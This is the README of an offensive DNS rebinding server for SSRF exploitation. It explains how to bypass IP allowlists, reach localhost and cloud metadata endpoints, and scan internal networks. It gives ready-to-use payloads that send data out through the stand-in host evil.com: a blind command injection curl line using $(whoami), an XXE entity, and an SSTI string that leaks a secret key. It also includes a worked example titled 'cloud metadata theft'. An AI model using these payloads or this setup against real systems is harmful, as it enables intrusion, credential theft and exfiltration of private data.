# DNS-Rebinder

DNS rebinding attack server for SSRF exploitation with interactive control, multiple strategies, and data exfiltration capture.

Based on [cujanovic's dns.py](https://github.com/cujanovic/SSRF-Testing/blob/master/dns.py).

---

## What Can This Do?

### 1. Bypass SSRF IP Allowlists
Target has SSRF but validates that the URL resolves to an "allowed" IP? This tool returns an allowed IP on first lookup, then switches to your target (127.0.0.1, 169.254.169.254, internal IPs) on subsequent lookups.

**Result:** Access localhost, cloud metadata, internal services through their SSRF.

### 2. Scan Internal Networks via SSRF
Using multi-target mode, each DNS query returns a different internal IP. Feed the SSRF a list of URLs and map their internal network without direct access.

**Result:** Discover internal hosts, services, and infrastructure.

### 3. Capture Exfiltrated Data
Any subdomain query to `*.exfil.yourdomain.com` is logged. Use for blind command injection, XXE, SSTI — anywhere you can trigger a DNS lookup.

**Result:** Confirm code execution, extract data through DNS (bypasses HTTP egress filters).

---

## Features

- **Multiple rebind strategies** — count, time-based, round-robin, random, multi-target
- **Live control** — Change IPs, strategies on the fly without restart
- **Subdomain exfiltration** — Capture data encoded in DNS queries
- **Config file** — Save your settings, just run `sudo python3 dns-rebinder.py`
- **Structured logging** — Human-readable + JSON logs
- **Setup wizard** — Interactive config when run with no args

## Installation

```bash
pip install twisted pyyaml
```

## Quick Start

### Interactive wizard (recommended for first use)
```bash
sudo python3 dns-rebinder.py
```

The wizard saves your config to `dns-rebinder.yaml`. Next time, just run:
```bash
sudo python3 dns-rebinder.py
```

### Command line
```bash
sudo python3 dns-rebinder.py \
    -w 8.8.8.8 \
    -r 127.0.0.1 \
    -s YOUR_SERVER_IP \
    -d evil.com
```

### Test it
```bash
dig test.evil.com @YOUR_SERVER_IP   # Returns 8.8.8.8
dig test.evil.com @YOUR_SERVER_IP   # Returns 127.0.0.1 (rebound!)
```

---

## Config File

Settings are saved to `dns-rebinder.yaml` after running the wizard.

```yaml
whitelist: 8.8.8.8
rebind:
  - 127.0.0.1
server: 1.2.3.4
domain: evil.com
port: 53
strategy: count 1
exfil_prefix: exfil
```

**Custom config path:**
```bash
sudo python3 dns-rebinder.py -c /path/to/config.yaml
```

CLI arguments override config file values.

---

## Rebind Strategies

### Count (default)
Rebind after N queries to the same hostname.

```bash
# Rebind on 2nd query (default)
--strategy count 1

# Rebind on 3rd query (survive 2 validation checks)
--strategy count 2
```

```
Query 1 → 8.8.8.8 (whitelist)
Query 2 → 127.0.0.1 (REBIND)
Query 3 → 127.0.0.1
```

**Use when:** Most SSRF scenarios. App resolves once to validate, again to connect.

---

### Time
Rebind after N seconds from first query to that hostname.

```bash
# Rebind after 5 seconds
--strategy time 5
```

```
0-5 seconds  → 8.8.8.8 (whitelist)
5+ seconds   → 127.0.0.1 (REBIND)
```

**Use when:** App makes multiple rapid queries during validation, but delays before actual request.

---

### Round-Robin
Alternate between whitelist and rebind on every query.

```bash
--strategy round-robin
```

```
Query 1 → 8.8.8.8
Query 2 → 127.0.0.1
Query 3 → 8.8.8.8
Query 4 → 127.0.0.1
```

**Use when:** Race conditions or TOCTOU attacks. Increases odds of hitting the right timing window.

---

### Random
Probabilistic rebinding (first query always returns whitelist).

```bash
# 50% rebind probability (default)
--strategy random 0.5

# 30% rebind probability
--strategy random 0.3
```

**Use when:** Unknown app behavior, spray-and-pray approach, or bypassing caching layers.

---

### Multi-Target
Cycle through multiple rebind IPs. Great for internal network scanning via SSRF.

```bash
# Cycle through internal IPs after 1 whitelist query
--strategy multi-target 1 -r 127.0.0.1,169.254.169.254,10.0.0.1,192.168.1.1
```

```
Query 1 → 8.8.8.8 (whitelist)
Query 2 → 127.0.0.1
Query 3 → 169.254.169.254
Query 4 → 10.0.0.1
Query 5 → 192.168.1.1
Query 6 → 127.0.0.1 (cycles)
```

**Use when:** Scanning internal network through an SSRF.

---

## Subdomain Data Exfiltration

Capture data encoded in DNS queries. Useful for:
- Blind command injection: `$(whoami).exfil.evil.com`
- Data exfiltration: `secret-token.exfil.evil.com`
- Out-of-band testing: Confirm code execution paths

### How it works

Any query matching `*.EXFIL_PREFIX.DOMAIN` is logged:

```bash
dig admin-user.exfil.evil.com @YOUR_SERVER
```

Output:
```
[12:34:56.789] EXFIL admin-user
             from admin-user.exfil.evil.com (1.2.3.4)
```

### Payload examples

**Blind command injection:**
```bash
curl "http://target/vuln?cmd=$(whoami).exfil.evil.com"
```

**XXE exfil:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://secret-data.exfil.evil.com/x">
]>
<foo>&xxe;</foo>
```

**SSTI:**
```
{{config.SECRET_KEY}}.exfil.evil.com
```

### Logs

Exfiltrated data is saved to:
- `dns-exfil-TIMESTAMP.log` — Dedicated exfil log
- `dns-rebind-TIMESTAMP.json` — Full JSON log with all events

---

## Interactive Commands

While running, type commands at the prompt:

| Command | Description |
|---------|-------------|
| `status` | Show config, stats, log paths |
| `set whitelist <ip>` | Change whitelist IP |
| `set rebind <ip>[,ip2,...]` | Change rebind IPs |
| `set strategy <name> [opts]` | Change strategy live |
| `set exfil <prefix>` | Change exfil subdomain prefix |
| `reset [hostname]` | Reset query state |
| `hosts` | List all tracked hostnames |
| `log [n]` | Show last N queries |
| `exfil` | Show exfil summary |
| `help` | Show all commands |
| `quit` | Stop server |

### Examples

```
> set rebind 169.254.169.254
Rebind IPs: ['127.0.0.1'] -> ['169.254.169.254']

> set strategy time 3
Strategy: count (rebind after 1 queries) -> time (rebind after 3.0s)

> hosts
Tracked hosts (2):
──────────────────────────────────────────────────────────────────────
  Hostname                                  Queries     Last Response
──────────────────────────────────────────────────────────────────────
  test.evil.com                                   5    127.0.0.1 (REBIND)
  api.evil.com                                    2    8.8.8.8 (whitelist)
```

---

## Logging

Three log files are created per session:

| File | Contents |
|------|----------|
| `dns-rebind-TIMESTAMP.log` | Human-readable query log |
| `dns-rebind-TIMESTAMP.json` | Structured JSON (for parsing) |
| `dns-exfil-TIMESTAMP.log` | Exfiltrated data only |

---

## DNS Setup

You need NS records pointing to your server.

### Example (evil.com)

```
; DNS records for evil.com
@       IN  A       YOUR_SERVER_IP
@       IN  NS      ns1.evil.com.
@       IN  NS      ns2.evil.com.
ns1     IN  A       YOUR_SERVER_IP
ns2     IN  A       YOUR_SERVER_IP
*       IN  A       YOUR_SERVER_IP
```

Or use a subdomain:
```
; rebind.evil.com handled by your server
rebind  IN  NS      ns1.rebind.evil.com.
ns1.rebind IN A     YOUR_SERVER_IP
```

---

## Command Line Reference

```
usage: dns-rebinder.py [-h] [-c CONFIG] [-w IP] [-r IPS] [-s IP]
                       [-p PORT] [-d DOMAIN] [--strategy NAME [OPTS]]
                       [--exfil-prefix PREFIX] [--ttl TTL]

Options:
  -c, --config FILE           Config file path (default: dns-rebinder.yaml)
  -w, --whitelist IP          IP that passes target's allowlist
  -r, --rebind IPS            Rebind IP(s), comma-separated
  -s, --server IP             Your server's public IP
  -p, --port PORT             DNS port (default: 53)
  -d, --domain DOMAIN         Your domain
  --strategy NAME [OPTS]      Rebind strategy (see above)
  --exfil-prefix PREFIX       Exfil subdomain prefix (default: exfil)
  --ttl TTL                   DNS TTL (default: 0)
```

---

## Examples

### Basic SSRF bypass
```bash
sudo python3 dns-rebinder.py -w 8.8.8.8 -r 127.0.0.1 -s 1.2.3.4 -d evil.com
```

### Cloud metadata theft
```bash
sudo python3 dns-rebinder.py -w 8.8.8.8 -r 169.254.169.254 -s 1.2.3.4 -d evil.com
```

### Internal network scan
```bash
sudo python3 dns-rebinder.py \
    -w 8.8.8.8 \
    -r 10.0.0.1,10.0.0.2,10.0.0.3,10.0.0.4,10.0.0.5 \
    -s 1.2.3.4 \
    -d evil.com \
    --strategy multi-target 1
```

### Time-based (survive multiple validations)
```bash
sudo python3 dns-rebinder.py \
    -w 8.8.8.8 \
    -r 127.0.0.1 \
    -s 1.2.3.4 \
    -d evil.com \
    --strategy time 5
```

---

## License

MIT
